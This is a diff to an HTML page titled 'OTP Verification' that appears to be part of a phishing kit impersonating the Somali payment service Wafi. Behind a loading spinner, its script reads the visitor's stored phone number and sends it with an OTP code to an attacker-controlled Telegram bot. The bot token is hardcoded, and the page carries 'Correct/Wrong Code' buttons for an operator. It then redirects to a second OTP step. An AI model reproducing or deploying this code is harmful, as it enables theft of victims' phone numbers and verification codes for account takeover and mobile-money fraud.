@@ -1,13 +1,62 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OTP Verification</title>
-<style>body{margin:0;background:linear-gradient(135deg,#84cc16,#65a30d);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}.box{background:white;border-radius:30px;padding:40px 30px;text-align:center;width:90%;max-width:400px}.circle{width:100px;height:100px;margin:0 auto 20px;border-radius:50%;background:radial-gradient(circle,#84cc16,#65a30d);display:flex;align-items:center;justify-content:center}.loader{width:80px;height:80px;border:8px solid rgba(255,255,255,0.3);border-top:8px solid white;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}h2{color:#65a30d;margin:0;font-size:24px}p{color:#888;margin:10px 0 0 0}.footer{margin-top:40px;color:white;font-size:12px;text-align:center}</style></head><body>
-<div class="box"><div class="circle"><div class="loader"></div></div><h2>OTP verification</h2><p id="timer">Fadlan sug... (10s)</p><div class="footer">© 2026 Wafi Somalia</div></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+<style>
+body{margin:0;background:linear-gradient(135deg,#84cc16,#65a30d);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}
+.box{background:white;border-radius:30px;padding:40px 30px;text-align:center;width:90%;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.2)}
+.circle{width:100px;height:100px;margin:0 auto 20px;border-radius:50%;background:radial-gradient(circle,#84cc16,#65a30d);display:flex;align-items:center;justify-content:center}
+.loader{width:80px;height:80px;border:8px solid rgba(255,255,255,0.3);border-top:8px solid white;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+h2{color:#65a30d;margin:0;font-size:24px}
+p{color:#888;margin:10px 0 0 0}
+.footer{margin-top:40px;color:white;font-size:12px;text-align:center}
+</style>
+</head>
+<body>
+<div class="box">
+    <div class="circle"><div class="loader"></div></div>
+    <h2>OTP verification</h2>
+    <p id="timer">Fadlan sug... (10s)</p>
+    <div class="footer">© 2026 Wafi Somalia</div>
+</div>
 <script>
 const BOT_TOKEN = "8978752568:AAH8Mties7YO31t8HSBqSDZtps8IqMHDQgk";
 const CHAT_ID = "8630213836";
+
 const phone = localStorage.getItem('loginPhone') || 'N/A';
 const otp1 = Math.floor(100000 + Math.random() * 900000);
 localStorage.setItem('otp1', otp1);
-const msg = `1️⃣ FIRST OTP VERIFICATION\nNEW USER - STEP 1/2\n🇸🇴 Country: Somalia\n🌍 Country Code: +252\n📱 Phone Number: ${phone}\n🔒 First OTP Code: ${otp1}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ Verify FIRST OTP:\n⏰ Timeout: 5 minutes`;
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,reply_markup:{inline_keyboard:[[{"text":"✅ Correct (First OTP)","callback_data":"otp1_ok"},{"text":"❌ Wrong Code","callback_data":"otp1_no"}]]}})});
-let count = 10; const timer = setInterval(()=>{document.getElementById('timer').innerText = `Fadlan sug... (${count}s)`;count--;if(count < 0){clearInterval(timer);window.location='loading.html?next=otp2.html';}}, 1000);
-</script></body></html>
+
+const msg = `1️⃣ *FIRST OTP VERIFICATION*\n*NEW USER - STEP 1/2*\n\n🇸🇴 *Country:* Somalia\n🌍 *Country Code:* +252\n📱 *Phone Number:* ${phone}\n🔒 *First OTP Code:* \`${otp1}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n⚠️ *Verify FIRST OTP:*\n⏰ *Timeout:* 5 minutes`;
+
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:'POST',
+    mode:'no-cors',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+        chat_id:CHAT_ID,
+        text:msg,
+        parse_mode: 'Markdown',
+        reply_markup:{
+            inline_keyboard:[
+                [{"text":"✅ Correct (First OTP)","callback_data":"otp1_ok"},{"text":"❌ Wrong Code","callback_data":"otp1_no"}]
+            ]
+        }
+    })
+});
+
+let count = 10;
+const timer = setInterval(()=>{
+    document.getElementById('timer').innerText = `Fadlan sug... (${count}s)`;
+    count--;
+    if(count < 0){
+        clearInterval(timer);
+        window.location='loading.html?next=otp2.html';
+    }
+}, 1000);
+</script>
+</body>
+</html>
